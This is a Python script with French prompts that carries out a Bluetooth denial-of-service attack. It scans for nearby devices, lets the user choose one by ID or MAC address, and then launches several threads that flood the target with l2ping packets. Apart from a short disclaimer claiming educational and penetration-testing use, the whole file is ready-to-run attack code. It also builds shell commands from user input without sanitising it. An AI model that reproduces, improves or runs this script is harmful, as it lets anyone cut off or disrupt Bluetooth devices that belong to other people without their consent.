import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')

def main():
    print('Bluetooth DOS attack (vous allez empêcher une connexion Bluetooth, peu utile)\n')
    time.sleep(0.1)
    print('Ce script est fourni à des fins éducatives et légales de tests de pénétration uniquement. Les développeurs n'assument aucune responsabilité pour tout abus ou dommage causé par l'utilisation de ce programme. Il incombe uniquement à l'utilisateur final de s'assurer que ses actions sont conformes aux lois applicables et aux normes éthiques. En utilisant ce logiciel, vous acceptez de l'utiliser de manière responsable et d'accepter tous les risques associés.\n')

    if input("Acceptez-vous les conditions ? (y/n) > ").lower() == 'y':
        os.system('clear')
        print('Bluetooth DOS Script\n')
        print("Recherche en cours ...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()[1:]
        array = [line.split()[0] for line in lines]
        print("| id  |   Mac Address   |   Device Name  |")
        for i, line in enumerate(lines):
            print(f"| {i}   |   {line.split()[0]}   |   {''.join(line.split()[1:])} |")
        target_id = input('ID cible ou adresse Mac > ')
        target_addr = array[int(target_id)] if target_id.isdigit() else target_id
        packages_size = int(input('Taille des paquets > '))
        threads_count = int(input('Nombre de threads > '))
        os.system('clear')
        print("\x1b[31m[*] Démarrage de l'attaque DOS dans 3 secondes...")
        for i in range(3, 0, -1):
            print(f'[*] {i}')
            time.sleep(1)
        os.system('clear')
        print('[*] Construction...\n')
        for _ in range(threads_count):
            threading.Thread(target=DOS, args=[target_addr, packages_size]).start()
        print('[*] Construit..')
        print('[*] Démarrage...')
    else:
        print('Abandon...')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        print('\n[*] Abandonné')
    except Exception as e:
        print('[!] ERREUR:', e)
